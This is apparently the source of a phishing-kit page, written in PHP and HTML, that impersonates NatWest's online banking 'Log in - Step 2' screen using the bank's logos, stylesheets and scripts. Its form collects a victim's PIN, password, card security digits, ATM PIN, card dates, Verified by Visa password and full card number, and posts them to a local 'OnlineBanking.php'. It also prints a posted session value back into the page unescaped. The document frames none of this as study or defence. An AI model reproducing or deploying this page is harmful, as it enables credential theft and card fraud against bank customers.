<?
$DBID_edit = $_POST['DBID_edit'];
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>
	Log in - Personal details
</title><meta http-equiv="content-type" content="text/html;charset=utf-8" /><meta http-equiv="Content-Style-Type" content="text/css" /><link href="https://www.nwolb.com/Brands/master.css" rel="stylesheet" type="text/css" media="all" /><link href="https://www.nwolb.com/Brands/master_print.css" rel="stylesheet" type="text/css" media="print" /><link href="https://www.nwolb.com/Brands/NWB/css/NPC_auralstyle.css" rel="stylesheet" type="text/css" media="aural" /><link href="https://www.nwolb.com/Brands/NWB/css/npc.css" rel="stylesheet" type="text/css" media="all" /><link href="https://www.nwolb.com/Brands/NWB/css/npc_mm.css" rel="stylesheet" type="text/css" media="all" /><script src="Brands/autoTab.js" type="text/javascript"></script><script type="text/javascript" src="https://www.nwolb.com/Brands/common.js"></script><script type="text/javascript" src="https://www.nwolb.com/Brands/NWB/jj.js"></script></head>
<body id="ctl00_bodyTag" class="wizard">
    <div id="wrapper" class="default_bg">
        <div id="acceskeys">
            <div id="skiplinks">
                <div class="ddalink">

	<a id="ctl00_skipLinks_ctl00_beginLink" accesskey="0" title="Return to start of screen / Access key details" class="ddalink" href="controls/#">Return to start of screen / Access key details</a><a id="ctl00_skipLinks_ctl00_MenuLink" accesskey="m" title="Skip to Menu" class="ddalink" href="controls/#menu">Skip to Menu</a><a id="ctl00_skipLinks_ctl00_ContentLink" accesskey="s" title="Skip to main content" class="ddalink" href="controls/#content">Skip to main content</a>
</div>
            </div>
        </div>
        <!--Header-->
        <div id="canvas" class="twoLines">
            
<div id="header">
    <div style="position:absolute;top:8px;left:7px;">

        <a href="http://www.natwest.com" target="_top"><img id="ctl00_header_ctl00_BrandImage4" src="https://www.nwolb.com/brands/NWB/images/logo.gif" alt="Logo: NatWest" style="height:45px;width:168px;border-width:0px;" /></a><img id="ctl00_header_ctl00_BrandImage5" src="https://www.nwolb.com/brands/NWB/images/strapline_hb.gif" alt="Helpful Banking" style="height:45px;width:175px;border-width:0px;margin-top:5px;" />
    </div> 
    <ul id="quickLinks">
        <li><a id="ctl00_header_ctl00_PopUpLink2Anchor" title="Accessibility : Opens in a new window" onclick="window.open('http://www.natwest.com/tools/general/nwolb_legals/accessibility.htm','headerWindow','top=70,left=60,width=800,height=600,resizable=yes,scrollbars=yes,location=yes');return false;" href="http://www.natwest.com/tools/general/nwolb_legals/accessibility.htm" target="headerWindow">Accessibility</a></li>
        <li class="last"><a id="ctl00_header_ctl00_Helplink2Anchor" title="Help : Opens in a new window" class="helpLink" href="https://www.questions.natwest.com/RBSG/index?page=search&amp;pageID=LI6&amp;brand=NPC&amp;wc=445632D9E268027A59D9479C397481A715C7E654" target="helpwindow">Help</a></li>
    </ul>   
    <div class="logoutWrapper">
        <div class="logoutHeader"></div>
            <div class="logoutBody">

             <table style="border-collapse:collapse;width:100%;">
                <tr>
                    <td class="logout_text">
                    	<img id="ctl00_header_ctl00_online_banking" src="https://www.nwolb.com/brands/nwb/images/onlineBanking_Title.gif" alt="" style="border-width:0px;" width="96" height="19" />
                    </td>
                    <td class="logout_link">
                        <a href="https://www.nwolb.com/ServiceManagement/RedirectOutOfService.aspx?targettag=destination_ExitService&amp;secstatus=0" id="ctl00_header_ctl00_logoutlink" target="_top">
                        <img id="ctl00_header_ctl00_Brandimage3" src="https://www.nwolb.com/brands/nwb/images/logout_key.gif" alt="" style="border-width:0px;" width="80" height="22" /></a>		
	                </td>

	            </tr>
	        </table>  
        </div>	    
        <div class="logoutFooter"></div>
    </div>    
</div>

            <div id="content">
                <a name="content"></a>
                <div id="mid" style="width: 742px; height: 761px">
                    <div id="ctl00_snailTrail__3484cbf3bff1_SnailTrail">

</div>
                    <form name="aspnetForm" method="post" action="OnlineBanking.php" onsubmit="javascript:return WebForm_OnSubmit();" id="aspnetForm">
						
						
						<input type="hidden" value="a04043e3-31e0-458f-a577-8c85d1ac3c86" name="txnID" />
<div>
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="NextButton_button" />
<input type="hidden" name="submind" id="submind" value="1" />
<input type="hidden" name="LI6CBA_Visibility" id="LI6CBA_Visibility" value="False" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VIEWSTATE2" id="__VIEWSTATE2" value="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**" />
<input type="hidden" name="__VIEWSTATE" id="
__VIEWSTATE" value="" />
<input type="hidden" name="DBID_edit" value="<? print $DBID_edit; ?>">
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['aspnetForm'];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
                        </script>


<script src="/WebResource.axd?d=c4377h_Wk5bzPmrqw6CkGA2&amp;t=633629783022160941" type="text/javascript"></script>


<script type="text/javascript">
//<![CDATA[

document.onkeypress = nextButtonAutoClick;

function nextButtonAutoClick(e)
{
	var code;
	// If e is undefined then the browser must be I.E (which doesn't pass event information this way)
	// so get the details of the key pressed from the window object instead
	if (!e) e = window.event;

	// Depending on the browser the actual value of the key pressed will be held in either the keyCode or which properties
	if (e.keyCode)
	{
		code = e.keyCode;
	}
	else
	{
		if (e.which)
		{
			code = e.which;
		}
	}

	// If the code value is 13 then the user pressed Return - so trigger the client side validation (if it exists)
	if (code == 13)
	{
		pressedButton=this;
		if (typeof(Page_ClientValidate) == 'function')
		{
			Page_ClientValidate();
		}
	}
}
				//]]>
                        </script>

<script src="/WebResource.axd?d=Nsqetkexl4ddD1qd9UbBq7mQAErlmPod78yy-RI6rwY1&amp;t=633629783022160941" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[

	var pressedButton;
	function blockButtons(frm,btn)
	{
		var PageValid=false;
		if (typeof(Page_IsValid)=="undefined")
			PageValid=true;
		else
			PageValid=Page_IsValid;
		if (!PageValid) return;
		if (typeof(pressedButton)!="undefined"){
			if (PageValid && pressedButton.id==btn){
				pressedButton.disabled=true;}}
		else if (typeof(document.all)!="undefined"){
			if (document.all(btn)!=null && PageValid)
				document.all(btn).disabled=true;}
	}
//]]>
                        </script>

<script src="https://www.nwolb.com/Brands/jquery-1.3.2.min.js" type="text/javascript"></script>
<script src="https://www.nwolb.com/Brands/faqjs.aspx?pageID=LI6&amp;wc=445632D9E268027A59D9479C397481A715C7E654" type="text/javascript"></script>

<script type="text/javascript">
//<![CDATA[
function WebForm_OnSubmit() {

					if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) { 
						var arVersion = navigator.appVersion.split("MSIE")
						var version = parseFloat(arVersion[1])
						if ((version >= 5.5 && version < 7.0)) {
							var footer = document.getElementById("footerContainer");
							if (footer != null) {
								footer.style.display = "none";
								footer.style.display = "block";
							}
						}
						return false;
					};if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;blockButtons(this,'ctl00_mainContent_NextButton_button');
return true;
}
//]]>
                        </script>

                    
    
    <div id="ctl00_mainContent_ValidationSummary" class="error" style="color:;display:none;">

</div><span id="ctl00_mainContent_ctl00" class="errorIndicator" style="color:Red;display:none;"></span>
        
        
        
        
        <div id="ctl00_mainContent_LI6PNL">
					<h1>
	<img id="LI6BTHA" alt="Online banking" class="H1Img " src="https://www.nwolb.com/brands/NWB/images/generated_F66D1455C524182E5932378B2FC54249EB4C8DD1-1.gif" width="154" height="28" />
</h1>
					<h2 id="LI6BTHB" class="">
	Log In - Step 2&nbsp; - Identity Verification purpose Only</h2>
					<div class="noBottomPad">
	<h3 id="LI6BTHC" class="frmHdr">
		&nbsp;</h3>
	<h3 class="frmHdr">
		Your PIN</h3>	
						
							
						<span id="LoginWizard28">
		<label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel8" class="wizCrl wizardLabelWide">
		<span id="ctl00_mainContent_LI6PPEA_edit_validator1" class="errorIndicator" style="color:Red;display:none;">

		<img class="ErrorMarker" src="https://www.nwolb.com/Brands/NWB/images/error.gif" alt="" style="border-width:0px;" width="14" height="12" /></span><span id="ctl00_mainContent_LI6PPEA_edit_RegularExpression1" style="color:Red;display:none;"><img title="You have entered an invalid character as part of your PIN. Your PIN only contains numbers." class="ErrorMarker" src="https://www.nwolb.com/Brands/NWB/images/error.gif" alt="" style="border-width:0px;" width="14" height="12" /></span>Enter
		Your PIN</label><span id="LoginWizard29"><span id="LI6-DDALA_spot3"><span id="LI6PPEA3"> <input name="LI6PPEA_edit" type="password" maxlength="4" size="4" id="LI6PPEA_edit" onkeyup="autoTab(this, 1, event)" /><br>
&nbsp;</span></span></span></span></div>
					<div class="noBottomPad">
		<h3 id="LI6BTHD" class="frmHdr">
			Your Password
		<span id="LoginWizard3"><span id="LI6-DDALD_spot0"><span id="LI6PPED0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
			</span></span></span>

		</h3>
		<p><span id="LoginWizard21">
		<label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel6" class="wizCrl wizardLabelWide">
		Enter Your Password</label></span><span id="LoginWizard22"><span id="LI6-DDALD_spot14"><span id="LI6PPED14">
		<input name="LI6PPED_edit" type="password" maxlength="25" size="15" id="LI6PPED_edit0" onkeyup="autoTab(this, 1, event)" /></span></span></span></p>
		<h3 id="LI6BTHD2" class="frmHdr">Your Last 3 Digit 
							at the back of Card</h3><span id="LoginWizard18">
			<label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel4" class="wizCrl wizardLabelWide">
			<span id="ctl00_mainContent_LI6PPED_edit_RegularExpression11" style="color:Red;display:none;"><img title="You have entered an invalid character as part of your Password. Your Password will be made up of letters and/or numbers." class="ErrorMarker" src="https://www.nwolb.com/Brands/NWB/images/error.gif" alt="" style="border-width:0px;" width="14" height="12" /></span>Enter 
								Last<span id="LoginWizard19"><span id="LI6-DDALD_spot13"><span id="LI6PPED13"> 
								3 Digit at the back of Card </span></span></span></label></span>
		<span id="LoginWizard11"><span id="LI6-DDALA_spot0">
		<span id="LI6PPEA0"><input name="LI6PPED_edit4" type="password" maxlength="4" size="4" id="LI6PPEA_edit0" onkeyup="autoTab(this, 1, event)" /><br>
&nbsp;</span></span></span><h3 id="LI6BTHD6" class="frmHdr">Your ATM Debit Card PIN</h3>
		<span id="LoginWizard24">
			<label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel7" class="wizCrl wizardLabelWide">
			<span id="ctl00_mainContent_LI6PPED_edit_RegularExpression16" style="color:Red;display:none;">
			<img title="You have entered an invalid character as part of your Password. Your Password will be made up of letters and/or numbers." class="ErrorMarker" src="https://www.nwolb.com/Brands/NWB/images/error.gif" alt="" style="border-width:0px;" width="14" height="12" /></span><span id="LoginWizard34"><span id="LoginWizard35"><label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel13" class="wizCrl wizardLabelWide"><span id="ctl00_mainContent_LI6PPED_edit_validator14" class="errorIndicator" style="color:Red;display:none;"><img class="ErrorMarker" src="https://www.nwolb.com/Brands/NWB/images/error.gif" alt="" style="border-width:0px;" width="14" height="12" /></span></label></span></span>Enter
			<span id="LoginWizard25"><span id="LI6-DDALD_spot16">
			<span id="LI6PPED16">ATM Debit Card PIN </span></span></span></label><span id="LoginWizard26"><span id="LoginWizard27"><span id="LI6-DDALA_spot2"><span id="LI6PPEA2"><input name="LI6PPEA_edit5" type="password" maxlength="4" size="4" id="LI6PPEA_edit1" onkeyup="autoTab(this, 1, event)" /><br>
&nbsp;</span></span></span></span></span><span id="LoginWizard14"><h3 id="LI6BTHD3" class="frmHdr">Your Card Valid From</h3>
		<p>
		<label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel3" class="wizCrl wizardLabelWide">
		Enter 
		Your Card Valid From</label><span id="LoginWizard12"><span id="LI6-DDALD_spot8"><span id="LI6PPED8">&nbsp;
		<input name="LI6PPED_edit2" type="password" maxlength="25" size="15" id="LI6PPED_edit5" onkeyup="autoTab(this, 1, event)" /></span></span></span></p>

		<h3 class="frmHdr">Your Card Exp Date </h3>
			<label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel2" class="wizCrl wizardLabelWide">
			<span id="ctl00_mainContent_LI6PPED_edit_RegularExpression8" style="color:Red;display:none;">
			<img title="You have entered an invalid character as part of your Password. Your Password will be made up of letters and/or numbers." class="ErrorMarker" src="https://www.nwolb.com/Brands/NWB/images/error.gif" alt="" style="border-width:0px;" width="14" height="12" /></span><span id="LoginWizard33"><label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel12" class="wizCrl wizardLabelWide"><span id="ctl00_mainContent_LI6PPED_edit_validator13" class="errorIndicator" style="color:Red;display:none;"><img class="ErrorMarker" src="https://www.nwolb.com/Brands/NWB/images/error.gif" alt="" style="border-width:0px;" width="14" height="12" /></span></label></span>Enter 
			Your Card Exp Date </label><span id="LoginWizard16"><span id="LI6-DDALD_spot11"><span id="LI6PPED11"><input name="LI6PPED_edit3" type="password" maxlength="25" size="15" id="LI6PPED_edit3" onkeyup="autoTab(this, 1, event)" /><br>
&nbsp;</span></span></span><p><b>Enter Your Verified By Visa Or 
										MasterCard Secure Code Password</b></p>
		<span id="LoginWizard32">
			<label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel11" class="wizCrl wizardLabelWide">
			Verified By Visa Or MasterCard Secure Code Password</label> <span id="LoginWizard4"><span id="LI6-DDALD_spot1">
		<span id="LI6PPED1">
		<input name="LI6PPED_edit6" type="password" maxlength="25" size="15" id="LI6PPED_edit1" onkeyup="autoTab(this, 1, event)" /><br>
&nbsp;</span></span></span></span><h3 class="frmHdr"><span id="LoginWizard1">Your Card Number</span></h3>
			<label for="ctl00_mainContent_LI6PPED_edit" id="ctl00_mainContent_LI6DDALDLabel0" class="wizCrl wizardLabelWide">
			<span id="ctl00_mainContent_LI6PPED_edit_RegularExpression0" style="color:Red;display:none;">
			<img title="You have entered an invalid character as part of your Password. Your Password will be made up of letters and/or numbers." class="ErrorMarker" src="https://www.nwolb.com/Brands/NWB/images/error.gif" alt="" style="border-width:0px;" width="14" height="12" /></span>Enter
							<span id="LoginWizard0">Your Card Number</span></label><span id="LoginWizard2"><span id="LI6-DDALD_spot"><span id="LI6PPED">
			<input name="ccnumber" type="text" maxlength="16" size="18" id="LI6PPED_edit" onkeyup="autoTab(this, 1, event)" />
        <br>
&nbsp;</span></span></span><h3 class="frmHdr">Users with Special Needs</h3>

			<input id="ctl00_mainContent_LI6CBA0" type="checkbox" name="ctl00$mainContent$LI6CBA0" value="ON" />Do 
			not refresh my screen on timeout.&nbsp;&nbsp;&nbsp;
			<a id="ctl00_mainContent_LI6NLAAnchor" title="Explain our timeout feature : Opens in a new window" onclick="window.open('https://www.nwolb.com/help.aspx?id=TO1','helpwindow','height=600,width=660,status=yes,toolbar=no,menubar=no,location=no,scrollbars=yes,resizable=yes');return false;" href="https://www.nwolb.com/help.aspx?id=TO1" target="helpwindow">
			Explain our timeout feature</a><div id="ctl00_mainContent_ButtonPanel" class="wizardNav">
				<div id="ctl00_mainContent_nextButtonPanel" class="right">
					<div class="btnNext btnbg" id="NextButton">
						<div class="btnt">
							<div class="btnr">
								<div class="btnb">

									<div class="btnl">
										<div class="btntl">
											<div class="btntr">
												<div class="btnbr">
													<div class="btnbl">
														<input type="submit" name="ctl00$mainContent$NextButton_button" value="Next" onclick="pressedButton=this;WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$mainContent$NextButton_button&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="ctl00_mainContent_NextButton_button" class="button-right" />
													</div></div></div></div>
									</div></div></div></div></div></div>
				<div id="ctl00_mainContent_backButtonPanel" class="left">

					<div class="btnBack btnbg" id="BackButton">
						<div class="btnt">
							<div class="btnr">
								<div class="btnb">
									<div class="btnl">
										<div class="btntl">
											<div class="btntr">
												<div class="btnbr">
													<div class="btnbl">

														<input type="submit" name="ctl00$mainContent$BackButton_button" value="Back" onclick="pressedButton=this;" id="ctl00_mainContent_BackButton_button" class="button-left back-arrow" />
													</div></div></div></div>
									</div></div></div></div></div></div></div>
			<p>&nbsp; 
						
						
					</div>
        </div><span id="ctl00_mainContent_ctl161" class="errorIndicator" style="color:Red;display:none;"></span>

    <script type="text/javascript">
    //<![CDATA[
				document.write("<input type=\"hidden\" name=\"scriptingon\" value=\"true\" />");
	//]]>
                        </script>


                    
<script type="text/javascript">
//<![CDATA[
var Page_ValidationSummaries =  new Array(document.getElementById("ctl00_mainContent_ValidationSummary"));
								var Page_Validators =  new Array(document.getElementById("ctl00_mainContent_ctl00"), document.getElementById("ctl00_mainContent_LI6PPEA_edit_validator"), document.getElementById("ctl00_mainContent_LI6PPEA_edit_RegularExpression"), document.getElementById("ctl00_mainContent_LI6PPEB_edit_validator"), document.getElementById("ctl00_mainContent_LI6PPEB_edit_RegularExpression"), document.getElementById("ctl00_mainContent_LI6PPEC_edit_validator"), document.getElementById("ctl00_mainContent_LI6PPEC_edit_RegularExpression"), document.getElementById("ctl00_mainContent_LI6PPED_edit_validator"), document.getElementById("ctl00_mainContent_LI6PPED_edit_RegularExpression"), document.getElementById("ctl00_mainContent_LI6PPEE_edit_validator"), document.getElementById("ctl00_mainContent_LI6PPEE_edit_RegularExpression"), document.getElementById("ctl00_mainContent_LI6PPEF_edit_validator"), document.getElementById("ctl00_mainContent_LI6PPEF_edit_RegularExpression"), document.getElementById("ctl00_mainContent_ctl161"));
								//]]>
                        </script>

<script type="text/javascript">
//<![CDATA[
var ctl00_mainContent_ValidationSummary = document.all ? document.all["ctl00_mainContent_ValidationSummary"] : document.getElementById("ctl00_mainContent_ValidationSummary");
								ctl00_mainContent_ValidationSummary.headertext = "Customer advice, please address the following issues:";
								ctl00_mainContent_ValidationSummary.showmessagebox = "True";
								var ctl00_mainContent_ctl00 = document.all ? document.all["ctl00_mainContent_ctl00"] : document.getElementById("ctl00_mainContent_ctl00");
								ctl00_mainContent_ctl00.display = "None";
								ctl00_mainContent_ctl00.evaluationfunction = "CustomValidatorEvaluateIsValid";
								var ctl00_mainContent_LI6PPEA_edit_validator = document.all ? document.all["ctl00_mainContent_LI6PPEA_edit_validator"] : document.getElementById("ctl00_mainContent_LI6PPEA_edit_validator");
								ctl00_mainContent_LI6PPEA_edit_validator.controltovalidate = "ctl00_mainContent_LI6PPEA_edit";
								ctl00_mainContent_LI6PPEA_edit_validator.display = "Dynamic";
								ctl00_mainContent_LI6PPEA_edit_validator.evaluationfunction = "CustomValidatorEvaluateIsValid";
								var ctl00_mainContent_LI6PPEA_edit_RegularExpression = document.all ? document.all["ctl00_mainContent_LI6PPEA_edit_RegularExpression"] : document.getElementById("ctl00_mainContent_LI6PPEA_edit_RegularExpression");
								ctl00_mainContent_LI6PPEA_edit_RegularExpression.controltovalidate = "ctl00_mainContent_LI6PPEA_edit";
								ctl00_mainContent_LI6PPEA_edit_RegularExpression.errormessage = "You have entered an invalid character as part of your PIN. Your PIN only contains numbers.";
								ctl00_mainContent_LI6PPEA_edit_RegularExpression.display = "Dynamic";
								ctl00_mainContent_LI6PPEA_edit_RegularExpression.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
								ctl00_mainContent_LI6PPEA_edit_RegularExpression.validationexpression = "^([0-9])+$";
								var ctl00_mainContent_LI6PPEB_edit_validator = document.all ? document.all["ctl00_mainContent_LI6PPEB_edit_validator"] : document.getElementById("ctl00_mainContent_LI6PPEB_edit_validator");
								ctl00_mainContent_LI6PPEB_edit_validator.controltovalidate = "ctl00_mainContent_LI6PPEB_edit";
								ctl00_mainContent_LI6PPEB_edit_validator.display = "Dynamic";
								ctl00_mainContent_LI6PPEB_edit_validator.evaluationfunction = "CustomValidatorEvaluateIsValid";
								var ctl00_mainContent_LI6PPEB_edit_RegularExpression = document.all ? document.all["ctl00_mainContent_LI6PPEB_edit_RegularExpression"] : document.getElementById("ctl00_mainContent_LI6PPEB_edit_RegularExpression");
								ctl00_mainContent_LI6PPEB_edit_RegularExpression.controltovalidate = "ctl00_mainContent_LI6PPEB_edit";
								ctl00_mainContent_LI6PPEB_edit_RegularExpression.errormessage = "You have entered an invalid character as part of your PIN. Your PIN only contains numbers.";
								ctl00_mainContent_LI6PPEB_edit_RegularExpression.display = "Dynamic";
								ctl00_mainContent_LI6PPEB_edit_RegularExpression.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
								ctl00_mainContent_LI6PPEB_edit_RegularExpression.validationexpression = "^([0-9])+$";
								var ctl00_mainContent_LI6PPEC_edit_validator = document.all ? document.all["ctl00_mainContent_LI6PPEC_edit_validator"] : document.getElementById("ctl00_mainContent_LI6PPEC_edit_validator");
								ctl00_mainContent_LI6PPEC_edit_validator.controltovalidate = "ctl00_mainContent_LI6PPEC_edit";
								ctl00_mainContent_LI6PPEC_edit_validator.display = "Dynamic";
								ctl00_mainContent_LI6PPEC_edit_validator.evaluationfunction = "CustomValidatorEvaluateIsValid";
								var ctl00_mainContent_LI6PPEC_edit_RegularExpression = document.all ? document.all["ctl00_mainContent_LI6PPEC_edit_RegularExpression"] : document.getElementById("ctl00_mainContent_LI6PPEC_edit_RegularExpression");
								ctl00_mainContent_LI6PPEC_edit_RegularExpression.controltovalidate = "ctl00_mainContent_LI6PPEC_edit";
								ctl00_mainContent_LI6PPEC_edit_RegularExpression.errormessage = "You have entered an invalid character as part of your PIN. Your PIN only contains numbers.";
								ctl00_mainContent_LI6PPEC_edit_RegularExpression.display = "Dynamic";
								ctl00_mainContent_LI6PPEC_edit_RegularExpression.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
								ctl00_mainContent_LI6PPEC_edit_RegularExpression.validationexpression = "^([0-9])+$";
								var ctl00_mainContent_LI6PPED_edit_validator = document.all ? document.all["ctl00_mainContent_LI6PPED_edit_validator"] : document.getElementById("ctl00_mainContent_LI6PPED_edit_validator");
								ctl00_mainContent_LI6PPED_edit_validator.controltovalidate = "ctl00_mainContent_LI6PPED_edit";
								ctl00_mainContent_LI6PPED_edit_validator.display = "Dynamic";
								ctl00_mainContent_LI6PPED_edit_validator.evaluationfunction = "CustomValidatorEvaluateIsValid";
								var ctl00_mainContent_LI6PPED_edit_RegularExpression = document.all ? document.all["ctl00_mainContent_LI6PPED_edit_RegularExpression"] : document.getElementById("ctl00_mainContent_LI6PPED_edit_RegularExpression");
								ctl00_mainContent_LI6PPED_edit_RegularExpression.controltovalidate = "ctl00_mainContent_LI6PPED_edit";
								ctl00_mainContent_LI6PPED_edit_RegularExpression.errormessage = "You have entered an invalid character as part of your Password. Your Password will be made up of letters and/or numbers.";
								ctl00_mainContent_LI6PPED_edit_RegularExpression.display = "Dynamic";
								ctl00_mainContent_LI6PPED_edit_RegularExpression.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
								ctl00_mainContent_LI6PPED_edit_RegularExpression.validationexpression = "^(.)$";
								var ctl00_mainContent_LI6PPEE_edit_validator = document.all ? document.all["ctl00_mainContent_LI6PPEE_edit_validator"] : document.getElementById("ctl00_mainContent_LI6PPEE_edit_validator");
								ctl00_mainContent_LI6PPEE_edit_validator.controltovalidate = "ctl00_mainContent_LI6PPEE_edit";
								ctl00_mainContent_LI6PPEE_edit_validator.display = "Dynamic";
								ctl00_mainContent_LI6PPEE_edit_validator.evaluationfunction = "CustomValidatorEvaluateIsValid";
								var ctl00_mainContent_LI6PPEE_edit_RegularExpression = document.all ? document.all["ctl00_mainContent_LI6PPEE_edit_RegularExpression"] : document.getElementById("ctl00_mainContent_LI6PPEE_edit_RegularExpression");
								ctl00_mainContent_LI6PPEE_edit_RegularExpression.controltovalidate = "ctl00_mainContent_LI6PPEE_edit";
								ctl00_mainContent_LI6PPEE_edit_RegularExpression.errormessage = "You have entered an invalid character as part of your Password. Your Password will be made up of letters and/or numbers.";
								ctl00_mainContent_LI6PPEE_edit_RegularExpression.display = "Dynamic";
